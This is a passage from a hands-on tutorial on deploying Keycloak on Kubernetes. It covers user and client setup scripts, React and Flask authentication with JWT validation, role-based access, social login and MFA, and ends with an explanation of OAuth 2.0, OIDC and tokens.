# Tutorial 12 - Identity and Access Management with Keycloak

Learn how to add professional authentication and authorization to your applications using Keycloak - an open-source Identity and Access Management solution.

## What You'll Learn

- Deploy Keycloak on Kubernetes with PostgreSQL
- Create realms, users, and roles
- Configure client applications for authentication
- Integrate Keycloak with React and Flask applications
- Implement role-based access control (RBAC)
- Add social login and multi-factor authentication

## What is Keycloak?

**Keycloak** centralizes authentication for all your applications:
- **Single Sign-On (SSO)**: Login once, access all apps
- **Social Login**: Google, GitHub, Facebook, etc.
- **Multi-Factor Authentication (MFA)**: Extra security with OTP
- **User Management**: Create and manage users in one place
- **Standard Protocols**: OAuth 2.0, OpenID Connect, SAML

**Why use it?** Instead of building authentication yourself (and getting it wrong), Keycloak provides industry-standard security out of the box.

## Prerequisites

- Completed Tutorial 6 (Kubernetes Getting Started)
- kubectl configured and connected to your cluster
- Basic understanding of web applications

---

## Part 1: Quick Start - Deploy Keycloak

### Step 1: Configure Your Deployment

Edit `keycloak-chart/values.yaml` and change these values:

```yaml
# PostgreSQL Database
postgres:
  password: "CHANGE-THIS-PASSWORD-123"  # Pick a strong password

# Keycloak Admin Account
keycloak:
  adminPassword: "CHANGE-THIS-ADMIN-PASSWORD"  # Admin console password
  database:
    password: "CHANGE-THIS-PASSWORD-123"  # Must match postgres.password above

# Your Domain
domain: keycloak.ltu-m7011e-YOUR-NAME.se  # Replace YOUR-NAME
email: your.email@ltu.se                   # Your email for Let's Encrypt
```

### Step 2: Deploy Everything

```bash
cd 12-keycloak
./install.sh
```

This deploys both PostgreSQL and Keycloak in the `keycloak` namespace. It takes about 3-5 minutes.

### Step 3: Monitor the Deployment

```bash
# Watch pods starting up
kubectl get pods -n keycloak -w

# Expected output after a few minutes:
# NAME                         READY   STATUS    RESTARTS   AGE
# keycloak-xxxxxxxxxx-xxxxx    1/1     Running   0          3m
# postgres-statefulset-0       1/1     Running   0          5m
```

Press `Ctrl+C` when both pods show `Running` and `1/1` ready.

### Step 4: Access Keycloak

Open your browser to: `https://keycloak.ltu-m7011e-YOUR-NAME.se`

**Login credentials:**
- Username: `admin`
- Password: (the adminPassword you set in values.yaml)

**Note**: You'll see a certificate warning because we're using Let's Encrypt staging certificates. Click "Advanced" → "Proceed" to continue.

**🎉 Congratulations!** You now have Keycloak running.

---

## Part 2: Create Your First Realm

A **realm** is like a tenant - it manages a set of users, applications, roles, and settings. Let's create one for your project.

### Option A: Create Realm via UI

1. In Keycloak Admin Console, click the dropdown in the top-left (shows "master")
2. Click **"Create Realm"**
3. Fill in:
   - Realm name: `myapp`
   - Enabled: ON
4. Click **"Create"**

### Option B: Create Realm Automatically (via API)

Want to automate everything? Use the realm creation scripts!

**Bash version:**
```bash
# Edit the script to set your credentials
nano create-realm.sh

# Run it
./create-realm.sh
```

**Python version:**
```bash
# Edit the script to set your credentials
nano create-realm.py

# Run it
python3 create-realm.py
```

The scripts will:
- Create the realm `myapp`
- Enable login with email
- Enable password reset
- Enable brute force protection
- Configure sensible defaults

**Note**: All automation scripts have an `INSECURE` flag at the top that controls SSL certificate verification. Set to `true` for staging certificates (default), or `false` when using production Let's Encrypt certificates.

### Step 2: Create a Test User

1. Click **"Users"** in the left sidebar
2. Click **"Add user"**
3. Fill in:
   - Username: `testuser`
   - Email: `test@example.com`
   - First name: `Test`
   - Last name: `User`
   - Email verified: ON
   - Enabled: ON
4. Click **"Create"**

### Step 3: Set User Password

1. In the user details page, click the **"Credentials"** tab
2. Click **"Set password"**
3. Enter password: `testpass123`
4. Temporary: **OFF** (so password doesn't need to be changed on first login)
5. Click **"Save"** and confirm

### Step 4: Test Login

Open a new browser (incognito/private mode) and go to:
```
https://keycloak.ltu-m7011e-YOUR-NAME.se/realms/myapp/account
```

Login with:
- Username: `testuser`
- Password: `testpass123`

You should see the user account management page!

### Alternative: Create Users Automatically (via API)

Don't want to click through the UI? You can automate user creation using scripts!

We've included ready-to-use scripts: `create-user.sh` (bash) and `create-user.py` (Python).

**Configure the scripts** by editing the variables at the top:
- `KEYCLOAK_URL`: Your Keycloak domain
- `REALM`: The realm name you created
- `ADMIN_USER` and `ADMIN_PASSWORD`: Your admin credentials
- User details (username, email, name, password)

**Bash version** (`create-user.sh`):

```bash
#!/bin/bash

# Configuration
KEYCLOAK_URL="https://keycloak.ltu-m7011e-YOUR-NAME.se"
REALM="myapp"
ADMIN_USER="admin"
ADMIN_PASSWORD="your-admin-password"

# Get admin access token
echo "Getting admin token..."
TOKEN=$(curl -s -X POST "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$ADMIN_USER" \
  -d "password=$ADMIN_PASSWORD" \
  -d "grant_type=password" \
  -d "client_id=admin-cli" \
  | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

if [ -z "$TOKEN" ]; then
  echo "Failed to get admin token. Check your credentials."
  exit 1
fi

echo "Creating user..."

# Create user
USER_ID=$(curl -s -X POST "$KEYCLOAK_URL/admin/realms/$REALM/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "email": "test@example.com",
    "firstName": "Test",
    "lastName": "User",
    "enabled": true,
    "emailVerified": true
  }' -i | grep -i location | sed 's/.*\///')

if [ -z "$USER_ID" ]; then
  echo "Failed to create user. User may already exist."
  exit 1
fi

echo "User created with ID: $USER_ID"

# Set password
echo "Setting password..."
curl -s -X PUT "$KEYCLOAK_URL/admin/realms/$REALM/users/$USER_ID/reset-password" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "password",
    "value": "testpass123",
    "temporary": false
  }'

echo "User created successfully!"
echo "Username: testuser"
echo "Password: testpass123"
```

**Run it:**
```bash
# Edit the script first to set your Keycloak URL and credentials
nano create-user.sh

# Run it
./create-user.sh
```

**Python version** (`create-user.py`):

```python
#!/usr/bin/env python3
import requests
import sys

# Configuration
KEYCLOAK_URL = "https://keycloak.ltu-m7011e-YOUR-NAME.se"
REALM = "myapp"
ADMIN_USER = "admin"
ADMIN_PASSWORD = "your-admin-password"

def get_admin_token():
    """Get admin access token"""
    url = f"{KEYCLOAK_URL}/realms/master/protocol/openid-connect/token"
    data = {
        "username": ADMIN_USER,
        "password": ADMIN_PASSWORD,
        "grant_type": "password",
        "client_id": "admin-cli"
    }
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print(f"Failed to get token: {response.text}")
        sys.exit(1)
    return response.json()["access_token"]

def create_user(token, username, email, first_name, last_name, password):
    """Create a new user"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Create user
    user_data = {
        "username": username,
        "email": email,
        "firstName": first_name,
        "lastName": last_name,
        "enabled": True,
        "emailVerified": True
    }

    url = f"{KEYCLOAK_URL}/admin/realms/{REALM}/users"
    response = requests.post(url, json=user_data, headers=headers)

    if response.status_code == 201:
        # Get user ID from Location header
        user_id = response.headers["Location"].split("/")[-1]
        print(f"User created with ID: {user_id}")

        # Set password
        password_data = {
            "type": "password",
            "value": password,
            "temporary": False
        }
        pwd_url = f"{KEYCLOAK_URL}/admin/realms/{REALM}/users/{user_id}/reset-password"
        pwd_response = requests.put(pwd_url, json=password_data, headers=headers)

        if pwd_response.status_code == 204:
            print(f"Password set successfully!")
            return user_id
        else:
            print(f"Failed to set password: {pwd_response.text}")
    elif response.status_code == 409:
        print(f"User '{username}' already exists")
    else:
        print(f"Failed to create user: {response.text}")
        sys.exit(1)

if __name__ == "__main__":
    print("Getting admin token...")
    token = get_admin_token()

    print("Creating user...")
    create_user(
        token=token,
        username="testuser",
        email="test@example.com",
        first_name="Test",
        last_name="User",
        password="testpass123"
    )

    print("\nUser created successfully!")
    print("Username: testuser")
    print("Password: testpass123")
```

**Run it:**
```bash
# Edit the script first to set your Keycloak URL and credentials
nano create-user.py

# Run it
python3 create-user.py
```

**Why automate?**
- Create multiple test users quickly
- Set up demo environments automatically
- Integrate with CI/CD pipelines
- Bulk import users from existing systems

---

## Part 3: Create a Client Application

A **client** is an application that uses Keycloak for authentication (like your React app or Flask API).

### Option A: Create Client via UI

#### Step 1: Create a Public Client (for Frontend Apps)

1. Click **"Clients"** in left sidebar
2. Click **"Create client"**
3. **General Settings:**
   - Client type: `OpenID Connect`
   - Client ID: `my-frontend-app`
4. Click **"Next"**
5. **Capability config:**
   - Client authentication: **OFF** (public client - can't keep secrets)
   - Standard flow: **ON** (enables redirect-based login)
   - Direct access grants: **ON** (enables username/password login)
6. Click **"Next"**
7. **Login settings:**
   - Root URL: `http://localhost:3000` (your frontend dev server)
   - Valid redirect URIs: `http://localhost:3000/*`
   - Valid post logout redirect URIs: `http://localhost:3000/*`
   - Web origins: `http://localhost:3000` (enables CORS)
8. Click **"Save"**

**What did we just do?** We told Keycloak that an application running on `localhost:3000` is allowed to:
- Redirect users to Keycloak for login
- Receive authentication tokens
- Make CORS requests from the browser

### Option B: Create Client Automatically (via API)

Automate client creation with scripts!

**Configure the script** by editing variables at the top:
- `CLIENT_ID`: Your application's client ID
- `CLIENT_NAME`: Display name
- `CLIENT_TYPE`: `"public"` for frontend, `"confidential"` for backend
- `FRONTEND_URLS`: List of all URLs where your frontend can be accessed

**Important**: The `FRONTEND_URLS` list must include **all URLs** you'll use to access your frontend. OAuth requires exact matches for redirect URIs.

Example configuration in `create-client.py`:
```python
FRONTEND_URLS = [
    "http://localhost:3000",
    "http://127.0.0.1:3000",
]
```

For production deployments with a domain, add your production URL:
```python
FRONTEND_URLS = [
    "https://myapp.ltu-m7011e-yourname.se",
]
```

**Bash version:**
```bash
# Edit configuration
nano create-client.sh

# Create a public client (frontend)
./create-client.sh

# For a confidential client (backend API), edit CLIENT_TYPE="confidential" first
```

**Python version:**
```bash
# Edit configuration
nano create-client.py

# Run it
python3 create-client.py
```

The script will:
- Create the client with proper redirect URIs
- Configure CORS settings
- For confidential clients: retrieve and display the client secret

**Note**: Save the client secret immediately - it won't be shown again!

---

## Part 4: Integrate with a React Application

Now let's connect a React app to use Keycloak for login.

### Install Keycloak JavaScript Library

```bash
npm install keycloak-js
```

### Create Keycloak Configuration

Create `src/keycloak.js`:

```javascript
import Keycloak from 'keycloak-js';

const keycloak = new Keycloak({
  url: 'https://keycloak.ltu-m7011e-YOUR-NAME.se',  // Your Keycloak URL
  realm: 'myapp',                                    // The realm you created
  clientId: 'my-frontend-app'                        // The client you created
});

export default keycloak;
```

### Initialize Keycloak in Your App

Update `src/App.js`:

```javascript
import React, { useState, useEffect } from 'react';
import keycloak from './keycloak';

function App() {
  const [authenticated, setAuthenticated] = useState(false);
  const [user, setUser] = useState(null);

  useEffect(() => {
    // Initialize Keycloak
    keycloak.init({
      onLoad: 'login-required',  // Redirect to login if not authenticated
      checkLoginIframe: false
    }).then(authenticated => {
      setAuthenticated(authenticated);

      if (authenticated) {
        // Load user profile
        keycloak.loadUserProfile().then(profile => {
          setUser(profile);
        });
      }
    });
  }, []);

  const logout = () => {
    keycloak.logout();
  };

  if (!authenticated) {
    return <div>Loading...</div>;
  }

  return (
    <div>
      <h1>Welcome, {user?.firstName} {user?.lastName}!</h1>
      <p>Email: {user?.email}</p>
      <p>Username: {user?.username}</p>

      <h2>Your Access Token</h2>
      <pre style={{ fontSize: '10px', overflow: 'auto' }}>
        {keycloak.token}
      </pre>

      <button onClick={logout}>Logout</button>
    </div>
  );
}

export default App;
```

### Run Your App

```bash
npm start
```

Open `http://localhost:3000` - you'll be redirected to Keycloak's login page. Login with `testuser` / `testpass123` and you'll be redirected back to your app!

---

## Part 5: Protect a Flask Backend API

Now let's protect your backend API by validating JWT tokens from Keycloak.

### Install Dependencies

```bash
pip install flask pyjwt cryptography requests
```

### Create Flask App with JWT Validation

Create `app.py`:

```python
from flask import Flask, jsonify, request
import jwt
import requests
from functools import wraps

app = Flask(__name__)

# Keycloak configuration
KEYCLOAK_URL = "https://keycloak.ltu-m7011e-YOUR-NAME.se"
REALM = "myapp"
CERTS_URL = f"{KEYCLOAK_URL}/realms/{REALM}/protocol/openid-connect/certs"

# Cache for public keys
public_keys = None

def get_public_keys():
    """Fetch public keys from Keycloak for token verification"""
    global public_keys
    if not public_keys:
        response = requests.get(CERTS_URL)
        public_keys = response.json()
    return public_keys

def require_auth(f):
    """Decorator to require valid JWT token"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Get token from Authorization header
        auth_header = request.headers.get('Authorization')
        if not auth_header:
            return jsonify({'error': 'No authorization header'}), 401

        # Extract token (format: "Bearer <token>")
        parts = auth_header.split()
        if len(parts) != 2 or parts[0].lower() != 'bearer':
            return jsonify({'error': 'Invalid authorization header'}), 401

        token = parts[1]

        try:
            # Decode and verify token
            keys = get_public_keys()
            unverified_header = jwt.get_unverified_header(token)

            # Find matching public key
            rsa_key = None
            for key in keys['keys']:
                if key['kid'] == unverified_header['kid']:
                    rsa_key = jwt.algorithms.RSAAlgorithm.from_jwk(key)

            if not rsa_key:
                return jsonify({'error': 'Public key not found'}), 401

            # Verify token signature and claims
            payload = jwt.decode(
                token,
                rsa_key,
                algorithms=['RS256'],
                audience='account',
                options={'verify_exp': True}
            )

            # Add user info to request context
            request.user = payload
            return f(*args, **kwargs)

        except jwt.ExpiredSignatureError:
            return jsonify({'error': 'Token has expired'}), 401
        except jwt.InvalidTokenError as e:
            return jsonify({'error': f'Invalid token: {str(e)}'}), 401

    return decorated_function

@app.route('/api/public')
def public():
    """Public endpoint - no authentication required"""
    return jsonify({'message': 'This is public data'})

@app.route('/api/protected')
@require_auth
def protected():
    """Protected endpoint - requires valid token"""
    return jsonify({
        'message': 'This is protected data',
        'user': request.user['preferred_username'],
        'email': request.user.get('email', 'N/A')
    })

if __name__ == '__main__':
    app.run(debug=True, port=5000)
```

### Test Your Protected API

```bash
# Run Flask app
python app.py
```

In your React app, make an API call with the token:

```javascript
// Add this function to your React App.js
const callProtectedAPI = async () => {
  try {
    // Refresh token if needed (within 30 seconds of expiry)
    await keycloak.updateToken(30);

    const response = await fetch('http://localhost:5000/api/protected', {
      headers: {
        'Authorization': `Bearer ${keycloak.token}`
      }
    });

    const data = await response.json();
    console.log('Protected API response:', data);
  } catch (error) {
    console.error('API call failed:', error);
  }
};

// Add button to trigger it
<button onClick={callProtectedAPI}>Call Protected API</button>
```

**What's happening?**
1. React app sends the JWT token in the `Authorization` header
2. Flask verifies the token using Keycloak's public keys
3. If valid, Flask returns the protected data
4. If invalid/expired, Flask returns 401 Unauthorized

---

## Part 6: Add Roles and Authorization

Let's add role-based access control to limit what users can do.

### Step 1: Create Roles

1. In Keycloak, go to **"Realm roles"**
2. Click **"Create role"**
3. Create these roles:
   - Role name: `admin` → Description: `Administrator`
   - Role name: `editor` → Description: `Can edit content`
   - Role name: `viewer` → Description: `Read-only access`

### Step 2: Assign Roles to User

1. Go to **"Users"** → Click on `testuser`
2. Go to **"Role mapping"** tab
3. Click **"Assign role"**
4. Select `editor` role
5. Click **"Assign"**

### Step 3: Check Roles in Your Application

The JWT token now contains the user's roles. In React:

```javascript
// Check if user has a specific role
const hasRole = (role) => {
  return keycloak.hasRealmRole(role);
};

// Conditionally render based on role
{hasRole('admin') && (
  <button>Admin Only Feature</button>
)}

{hasRole('editor') && (
  <button>Edit Content</button>
)}
```

In Flask:

```python
@app.route('/api/admin-only')
@require_auth
def admin_only():
    # Get roles from token
    roles = request.user.get('realm_access', {}).get('roles', [])

    if 'admin' not in roles:
        return jsonify({'error': 'Admin access required'}), 403

    return jsonify({'message': 'Admin data'})
```

---

## Part 7: Add Social Login (GitHub Example)

Let users login with their GitHub account.

### Step 1: Create GitHub OAuth App

1. Go to GitHub → Settings → Developer settings → OAuth Apps
2. Click **"New OAuth App"**
3. Fill in:
   - Application name: `My Keycloak App`
   - Homepage URL: `https://keycloak.ltu-m7011e-YOUR-NAME.se`
   - Authorization callback URL: `https://keycloak.ltu-m7011e-YOUR-NAME.se/realms/myapp/broker/github/endpoint`
4. Click **"Register application"**
5. Copy the **Client ID** and **Client Secret**

### Step 2: Configure in Keycloak

1. In Keycloak, go to **"Identity providers"**
2. Click **"Add provider"** → Select **"GitHub"**
3. Fill in:
   - Alias: `github`
   - Display name: `GitHub`
   - Client ID: (paste from GitHub)
   - Client Secret: (paste from GitHub)
4. Click **"Add"**

### Step 3: Test Social Login

1. Logout from your app
2. Go to login page - you'll now see a **"GitHub"** button
3. Click it to authenticate with GitHub!

---

## Part 8: Enable Multi-Factor Authentication

Add extra security with Time-based One-Time Passwords (TOTP).

### Step 1: Configure OTP for User

1. Login to account console: `https://keycloak.ltu-m7011e-YOUR-NAME.se/realms/myapp/account`
2. Go to **"Account Security"** → **"Signing in"**
3. Click **"Set up"** under **"Mobile Authenticator"**
4. Scan the QR code with Google Authenticator or Authy app
5. Enter the 6-digit code to verify
6. **Save your recovery codes** in a safe place!

### Step 2: Test MFA

1. Logout and login again
2. After entering your password, you'll be prompted for the 6-digit OTP code
3. Open your authenticator app and enter the code

---

## Part 9: Complete Example Application

Want to see everything working together? Check out the `todo-app-example/` directory!

### What's Included

- **Full React frontend** with Keycloak authentication
- **Flask backend** with JWT token validation
- **Role-based access control** (admins see all todos, users see only their own)
- **Automatic token refresh**
- **Protected API endpoints**

### Quick Start

```bash
cd todo-app-example

# Start backend (Terminal 1)
./start-backend.sh

# Start frontend (Terminal 2)
./start-frontend.sh
```

See `todo-app-example/README.md` for detailed documentation.

---

## Part 10: Troubleshooting

### Keycloak Won't Start

```bash
# Check pod status
kubectl describe pod -n keycloak -l app=keycloak

# Check logs
kubectl logs -n keycloak -l app=keycloak

# Common issues:
# - Database password mismatch (check values.yaml)
# - Database not ready (wait longer)
# - Port conflicts (check if ports are in use)
```

### "Invalid Redirect URI" Error

**Problem**: Client not configured with correct redirect URI. This happens when the URL you're accessing your frontend from doesn't match the configured redirect URIs in Keycloak.

**Common scenario**: You configured `http://localhost:3000/*` but accessed via `http://127.0.0.1:3000`.

**Solution 1 - Use localhost**:
Always access your frontend at `http://localhost:3000`.

**Solution 2 - Manual configuration**:
1. Go to Keycloak Admin Console → Clients → Your client
2. Check "Valid Redirect URIs" includes the URL shown in the error
3. Add the missing URL (e.g., `http://127.0.0.1:3000/*`)
4. Add to "Web Origins" as well (e.g., `http://127.0.0.1:3000`)
5. Save changes

### CORS Errors

**Problem**: Browser blocks requests from your frontend to Keycloak.

**Solution**:
1. Go to Clients → Your client
2. Add your frontend URL to "Web Origins"
3. Use `http://localhost:3000` for development
4. Or use `+` to allow all valid redirect URIs

### Token Expired

**Problem**: Access token expired (default: 5 minutes).

**Solution**: Refresh the token before making API calls:

```javascript
// Refresh if expires in < 30 seconds
await keycloak.updateToken(30);
```

### Certificate Warnings

This is normal with Let's Encrypt staging certificates! For production:

1. Change `certIssuer: letsencrypt-prod` in values.yaml
2. Redeploy: `helm upgrade keycloak -n keycloak ./keycloak-chart`
3. Wait for certificate to be issued (1-2 minutes)
4. **Update automation scripts**: Change the `INSECURE` flag in all scripts

**Bash scripts** - Change at the top of each file:
```bash
INSECURE=false  # Was: INSECURE=true
```

**Python scripts** - Change at the top of each file:
```python
INSECURE = False  # Was: INSECURE = True
```

**Why?** Staging certificates are self-signed (untrusted), so scripts use `INSECURE=true` to bypass verification. Production certificates are properly trusted, so you should set `INSECURE=false` for better security.

The flag automatically controls:
- Bash: `-k` curl option (insecure mode)
- Python: `verify=False` in requests (SSL verification)

---

## Part 11: Cleanup

### Remove Everything

```bash
./uninstall.sh
```

Or manually:

```bash
# Delete Keycloak (includes PostgreSQL)
helm uninstall keycloak -n keycloak

# Delete data
kubectl delete pvc -n keycloak --all

# Delete namespace
kubectl delete namespace keycloak
```

---

## Understanding the Technology

This section provides a comprehensive technical explanation of OAuth 2.0, OpenID Connect, JWT, and how Keycloak implements these standards.

### The Foundation: OAuth 2.0

**OAuth 2.0** is an **authorization framework** (RFC 6749) that enables applications to obtain limited access to user resources without exposing credentials. It answers the question: **"What can you access?"**

#### Key Concepts

**Roles in OAuth 2.0:**
- **Resource Owner** - The user who owns the data
- **Client** - The application requesting access (your React/Flask app)
- **Authorization Server** - Issues access tokens (Keycloak)
- **Resource Server** - Hosts protected resources (your API)

**Grant Types:**
1. **Authorization Code** - Most secure, used for web apps (what we use)
2. **Implicit** - Deprecated, previously for SPAs
3. **Client Credentials** - For machine-to-machine communication
4. **Resource Owner Password** - Direct username/password (discouraged)
5. **Refresh Token** - Exchange refresh token for new access token

#### OAuth 2.0 Authorization Code Flow

```
┌─────────┐                                           ┌─────────────────┐
│ Browser │                                           │   Keycloak      │
│  (User) │                                           │ (Auth Server)   │
└────┬────┘                                           └────────┬────────┘
     │                                                          │
     │ 1. Click "Login"                                         │
     ├──────────────────────────────────────┐                  │
     │                                       ▼                  │
┌────┴────────┐                     ┌──────────────┐           │
│   React     │                     │              │           │
│  Frontend   │                     │              │           │
└────┬────────┘                     └──────────────┘           │
     │                                                          │
     │ 2. Redirect to Authorization Endpoint                   │
     │    GET /realms/myapp/protocol/openid-connect/auth       │
     │    ?client_id=my-frontend-app                           │
     │    &redirect_uri=http://localhost:3000                  │
     │    &response_type=code                                  │
     │    &scope=openid profile email                          │
     ├─────────────────────────────────────────────────────────>│
     │                                                          │
     │                                      3. Show Login Page  │
     │<─────────────────────────────────────────────────────────┤
     │                                                          │
     │ 4. User enters credentials                              │
     ├─────────────────────────────────────────────────────────>│
     │                                                          │
     │                                      5. Verify credentials│
     │                                         Create session   │
     │                                                          │
     │ 6. Redirect with Authorization Code                     │
     │    http://localhost:3000/?code=ABC123&state=XYZ         │
     │<─────────────────────────────────────────────────────────┤
     │                                                          │
     │ 7. Exchange code for tokens                             │
     │    POST /realms/myapp/protocol/openid-connect/token     │
     │    code=ABC123                                           │
     │    client_id=my-frontend-app                            │
     │    redirect_uri=http://localhost:3000                   │
     │    grant_type=authorization_code                        │
     ├─────────────────────────────────────────────────────────>│
     │                                                          │
     │                                      8. Validate code    │
     │                                         Issue tokens     │
     │                                                          │
     │ 9. Return tokens                                        │
     │    {                                                    │
     │      "access_token": "eyJhbGc...",                      │
     │      "id_token": "eyJhbGc...",                          │
     │      "refresh_token": "eyJhbGc...",                     │
     │      "token_type": "Bearer",                            │
     │      "expires_in": 300                                  │
     │    }                                                    │
     │<─────────────────────────────────────────────────────────┤
     │                                                          │
     │ 10. Store tokens in memory                              │
     │                                                          │
     │                                                          │
     │ 11. Call API with Access Token                          │
     ├──────────────────────────────────────┐                  │
     │                                       ▼                  │
     │                              ┌──────────────┐            │
     │                              │    Flask     │            │
     │                              │   Backend    │            │
     │  Authorization: Bearer token │     API      │            │
     ├─────────────────────────────>│              │            │
     │                              └──────┬───────┘            │
     │                                     │                    │
     │                                     │ 12. Verify token   │
     │                                     │  (check signature) │
     │                                     ├───────────────────>│
     │                                     │  GET /realms/myapp/│
     │                                     │  protocol/openid-  │
     │                                     │  connect/certs     │
     │                                     │                    │
     │                                     │ 13. Public keys    │
     │                                     │<───────────────────┤
     │                                     │                    │
     │                              14. Token valid             │
     │                                  Extract claims          │
     │                              ┌───────────────┐           │
     │ 15. Return protected data    │               │           │
     │<─────────────────────────────┤               │           │
     │                              └───────────────┘           │
     ▼                                                          │
```

**Why use authorization code instead of returning tokens directly?**
- The code is single-use and expires quickly (typically 60 seconds)
- The code is useless without the client credentials
- Tokens never pass through the browser's front channel (address bar)
- More secure against interception attacks

### OpenID Connect (OIDC)

**OpenID Connect** is an **authentication layer** built on top of OAuth 2.0 (RFC 6749). It answers: **"Who are you?"**

OAuth 2.0 alone doesn't provide authentication - it only provides authorization. OIDC adds:

1. **ID Token** - A JWT containing user identity information
2. **UserInfo Endpoint** - Standardized endpoint to get user profile
3. **Standard Claims** - Predefined user attributes (sub, name, email, etc.)
4. **Discovery** - Standardized metadata endpoint (/.well-known/openid-configuration)

#### OIDC Scopes

Scopes determine what information is included in tokens:

- `openid` - **Required** - Indicates OIDC flow, returns `sub` (subject/user ID)
- `profile` - Adds name, family_name, given_name, picture, etc.
- `email` - Adds email and email_verified
- `address` - Adds postal address
- `phone` - Adds phone number

#### OIDC vs OAuth 2.0

| Aspect | OAuth 2.0 | OIDC |
|--------|-----------|------|
| Purpose | Authorization | Authentication + Authorization |
| Primary Use | "Let app X access my photos" | "Prove who I am" |
| Returns | Access Token | ID Token + Access Token |
| User Info | No standard | UserInfo endpoint |
| Client Types | Public, Confidential | Same + Hybrid |

### JSON Web Tokens (JWT)

**JWT** (RFC 7519) is a compact, URL-safe token format for transmitting claims between parties. A JWT consists of three Base64URL-encoded parts separated by dots:

```
eyJhbGc...  .  eyJzdWI...  .  SflKxwRJ...
 │             │             │
Header        Payload       Signature
```

#### JWT Structure Deep Dive

**1. Header**
```json
{
  "alg": "RS256",           // Algorithm: RSA with SHA-256
  "typ": "JWT",             // Type: JSON Web Token
  "kid": "abc123"           // Key ID: identifies which key signed this
}
```

**Common algorithms:**
- `RS256` - RSA with SHA-256 (asymmetric, most common)
- `HS256` - HMAC with SHA-256 (symmetric, shared secret)
- `ES256` - ECDSA with SHA-256 (asymmetric, smaller keys)

**2. Payload (Claims)**
```json
{
  // Registered claims (RFC 7519)
  "iss": "https://keycloak.ltu-m7011e-johan.se/realms/myapp",  // Issuer
  "sub": "f4c8a9e6-1234-5678-90ab-cdef12345678",               // Subject (user ID)
  "aud": "account",                                             // Audience
  "exp": 1735689600,                                            // Expiration (Unix timestamp)
  "nbf": 1735689300,                                            // Not Before
  "iat": 1735689300,                                            // Issued At
  "jti": "abc-123-def-456",                                     // JWT ID (unique)

  // Public claims (OIDC standard)
  "name": "Test User",
  "given_name": "Test",
  "family_name": "User",
  "preferred_username": "testuser",
  "email": "test@example.com",
  "email_verified": true,

  // Private claims (Keycloak-specific)
  "realm_access": {
    "roles": ["user", "admin"]
  },
  "resource_access": {
    "my-frontend-app": {
      "roles": ["view-profile"]
    }
  },
  "scope": "openid profile email",
  "session_state": "xyz-789",
  "acr": "1",                    // Authentication Context Class Reference
  "azp": "my-frontend-app",      // Authorized Party
  "typ": "Bearer"
}
```

**3. Signature**

For RS256 (RSA asymmetric signing):

```
signature = RSA-SHA256(
  base64urlEncode(header) + "." + base64urlEncode(payload),
  privateKey
)
```

**Key properties:**
- **Stateless** - Token contains all necessary information
- **Self-contained** - No database lookup needed to verify
- **Tamper-proof** - Any modification invalidates the signature
- **Not encrypted** - Anyone can decode and read (use HTTPS!)

#### Token Verification Process

When your Flask backend receives a JWT:

```python
def verify_token(token):
    # 1. Decode header (no verification yet)
    header = jwt.get_unverified_header(token)
    kid = header['kid']  # Key ID

    # 2. Fetch Keycloak's public keys
    keys = requests.get(
        "https://keycloak.../realms/myapp/protocol/openid-connect/certs"
    ).json()

    # 3. Find matching public key
    public_key = find_key_by_kid(keys, kid)

    # 4. Verify signature and validate claims
    decoded = jwt.decode(
        token,
        public_key,
        algorithms=['RS256'],
        audience='account',
        issuer='https://keycloak.../realms/myapp',
        options={
            'verify_signature': True,   # Cryptographic verification
            'verify_exp': True,          # Check if expired
            'verify_nbf': True,          # Check if valid yet
            'verify_iss': True,          # Check issuer matches
            'verify_aud': True           # Check audience matches
        }
    )

    return decoded  # Token is valid!
```

**Why asymmetric signing (RS256)?**
- Keycloak holds **private key** (signs tokens)
- Your apps hold **public key** (verify tokens)
- Apps can verify tokens without calling Keycloak
- Public keys can be distributed safely
- More secure than shared secrets (HS256)

### Access Token vs ID Token vs Refresh Token

Keycloak issues three types of tokens:

#### 1. Access Token
**Purpose:** Authorize API requests

```json
{
  "typ": "Bearer",
  "azp": "my-frontend-app",
  "scope": "openid profile email",
  "realm_access": {
    "roles": ["user", "admin"]
  }
}
```

- Short-lived (5-15 minutes typical)
- Contains authorization info (roles, scopes)
- Sent in `Authorization: Bearer <token>` header
- Used by Resource Server (API) to authorize requests

#### 2. ID Token
**Purpose:** Prove user identity

```json
{
  "typ": "ID",
  "sub": "user-id-123",
  "name": "Test User",
  "email": "test@example.com",
  "email_verified": true
}
```

- Contains user profile information
- Conforms to OIDC specification
- Used by Client (frontend) to display user info
- Should NOT be sent to APIs (use access token instead)

#### 3. Refresh Token
**Purpose:** Obtain new access tokens without re-authentication

```json
{
  "typ": "Refresh",
  "scope": "openid profile email offline_access"
}
```

- Long-lived (days/weeks)
- Can be revoked by server
- Single-use or rotation (new refresh token with each use)
- Must be stored securely (not in localStorage!)
- Used at `/token` endpoint with `grant_type=refresh_token`

### Token Refresh Flow

```
┌─────────┐                                    ┌──────────────┐
│ React   │                                    │  Keycloak    │
│Frontend │                                    │              │
└────┬────┘                                    └──────┬───────┘
     │                                                │
     │ 1. API call with expired access token         │
     ├────────────┐                                   │
     │            ▼                                   │
     │      ┌──────────┐                             │
     │      │  Flask   │                             │
     │      │   API    │                             │
     │      └─────┬────┘                             │
     │            │                                   │
     │ 2. 401 Unauthorized (token expired)           │
     │<───────────┤                                   │
     │                                                │
     │ 3. POST /token with refresh token             │
     │    grant_type=refresh_token                   │
     │    refresh_token=eyJhbGc...                   │
     ├───────────────────────────────────────────────>│
     │                                                │
     │                                4. Verify token │
     │                                   Check not    │
     │                                   revoked      │
     │                                                │
     │ 5. New tokens                                  │
     │    {                                           │
     │      "access_token": "eyJnew...",              │
     │      "refresh_token": "eyJnew..." // rotation  │
     │    }                                           │
     │<───────────────────────────────────────────────┤
     │                                                │
     │ 6. Retry API call with new access token       │
     ├────────────┐                                   │
     │            ▼                                   │
     │      ┌──────────┐                             │
     │      │  Flask   │                             │
     │      │   API    │                             │
     │      └─────┬────┘                             │
     │            │                                   │
     │ 7. 200 OK with data                           │
     │<───────────┤                                   │
     ▼                                                │
```

### How Keycloak Implements These Standards

Keycloak is a complete **Identity and Access Management (IAM)** solution that implements:

